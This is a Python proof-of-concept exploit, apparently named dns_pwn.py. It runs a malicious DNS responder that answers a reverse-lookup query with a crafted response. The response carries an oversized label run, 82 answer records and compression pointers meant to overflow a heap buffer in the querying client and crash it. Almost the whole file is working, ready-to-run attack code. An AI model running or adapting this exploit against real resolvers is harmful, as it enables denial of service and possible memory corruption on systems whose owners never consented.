import socket
import struct
import sys

def dw(x):
    return struct.pack('>H', x)

def udp_handler(sock_udp):
    try:
        data, addr = sock_udp.recvfrom(1024)
        print(f'[*] Received {len(data)} bytes from {addr}')
        
        # Extract DNS ID to match the response
        dns_id = data[0:2]

        # Header: ID, Flags (Standard response), Questions (1), Answers (82), Auth (0), Add (0)
        res = dns_id                             # Use incoming ID
        res += dw(0x85a0)                        # Flags
        res += dw(1)                             # Questions
        res += dw(0x52)                          # Answers (82)
        res += dw(0)                             # Authoritative
        res += dw(0)                             # Additional

        # Question section (matching the PoC's hardcoded query)
        res += b'\x03125\x018\x018\x018\x07in-addr\x04arpa\x00' + b'\x00\x0c' + b'\x00\x01'

        # Trigger the Overflow (The 'Z' padding)
        res += (b'\xc0\x0c' + b'\x00\x0c' + b'\x00\x01' + b'\x00\x00\x00\x3d' + 
                b'\x04\x00' + (b'\x3e' + b'Z'*62) * 16 + b'\x0e' + b'Z'*14 + b'\x00')

        # Next answer
        res += (b'\xc0\x0c' + b'\x00\x0c' + b'\x00\x01' + b'\x00\x00\x00\x3d' + 
                b'\x00\x26' + b'\x08DCBBEEEE\x04DDDD\x08CCCCCCCC\x04AAAA\x04BBBB\x03com\x00')

        # Fill the heap buffer
        for _ in range(79):
            res += b'\xc0\x0c' + b'\x00\x0c' + b'\x00\x01' + b'\x00\x00\x00\x3d' + b'\x00\x02' + b'\xc4\x40'

        res += b'\xc0\x0c' + b'\x00\x0c' + b'\x00\x01' + b'\x00\x00\x00\x3d' + b'\x00\x11' + b'\x04EEEE\x09DAABBEEEE\xc4\x49'

        sock_udp.sendto(res, addr)
        print("[+] Exploit payload sent. Target should crash.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f'Usage: python3 {sys.argv[0]} <listen_ip> <port>')
        print('Example: python3 dns_pwn.py 0.0.0.0 53')
        sys.exit(0)

    ip = sys.argv[1]
    port = int(sys.argv[2])

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind((ip, port))
        print(f"[*] DNS Responder active on {ip}:{port}...")
        print("[*] Waiting for target to make a DNS request...")
        while True:
            udp_handler(sock)
    except PermissionError:
        print("[!] Error: You need sudo/root privileges to bind to port 53.")
    except Exception as e:
        print(f"[!] Failed to start: {e}")

